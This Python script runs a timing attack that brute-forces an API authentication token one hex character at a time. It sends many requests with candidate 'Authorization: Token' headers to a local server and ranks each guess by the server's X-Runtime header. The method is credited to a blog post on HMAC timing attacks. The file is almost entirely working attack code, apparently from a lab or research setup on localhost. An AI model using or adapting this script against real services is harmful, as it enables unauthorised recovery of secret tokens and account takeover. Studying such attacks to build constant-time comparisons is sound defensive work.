#!/usr/bin/env python

"""
Algorithm ideas taken from:
http://www.eggie5.com/45-hmac-timing-attacks
"""
import requests
import random
import numpy
import pprint

from utils.progress import progress


VALID_TOKEN_START = '224a93060c0dd4fb931d05083b4cb7b6a8c2'
VALID_TOKEN_END = '7df8'
VALID_TOKEN_LEN = len(VALID_TOKEN_START) + len(VALID_TOKEN_END)

CHARSET = list('0123456789abcdef')

URL = 'http://127.0.0.1:8000/users/'
NUM_SAMPLES = 50000


def get_next_char_with_timing(current_token_chars):
    session = requests.Session()
    historic_charset_timing = {}

    for i in xrange(NUM_SAMPLES):

        current_charset_timing = {}

        shuffled_charset = CHARSET[:]
        random.shuffle(shuffled_charset)

        for current_char in shuffled_charset:
            test_token = current_token_chars + current_char + CHARSET[0] * (VALID_TOKEN_LEN - 1)

            response = session.get(URL, headers={'Authorization': 'Token %s' % test_token})
            current_charset_timing[current_char] = float(response.headers['X-Runtime'])

        progress(i, NUM_SAMPLES)

        ranked_charset_timing = rank_charset_timing(current_charset_timing)

        for ichar in ranked_charset_timing:
            if ichar in historic_charset_timing:
                historic_charset_timing[ichar].append(ranked_charset_timing[ichar])
            else:
                historic_charset_timing[ichar] = [ranked_charset_timing[ichar]]

    average_char_ranking = {}

    for ichar in historic_charset_timing:
        average_char_ranking[ichar] = numpy.mean(historic_charset_timing[ichar])

    avg_items = average_char_ranking.items()
    avg_items.sort(value_sort)

    found_char = avg_items[0][0]
    print('Found character "%s"' % found_char)
    pprint.pprint(avg_items)
    pprint.pprint(average_char_ranking)

    return found_char


def rank_charset_timing(charset_timing):
    ranked = {}

    charset_items = charset_timing.items()
    charset_items.sort(value_sort)
    charset_items.reverse()

    for i, item in enumerate(charset_items):
        ranked[item[0]] = i

    return ranked


def value_sort(x, y):
    return cmp(x[1], y[1])


def warm_up(warm_up_token):
    """
    Use different TCP/IP connections to warm up all the threads
    """
    for i in xrange(20):
        requests.get(URL, headers={'Authorization': 'Token %s' % warm_up_token})


if __name__ == '__main__':
    warm_up_token = VALID_TOKEN_START + CHARSET[0] * len(VALID_TOKEN_END)
    warm_up(warm_up_token)

    current_token = VALID_TOKEN_START
    found_char = get_next_char_with_timing(current_token)
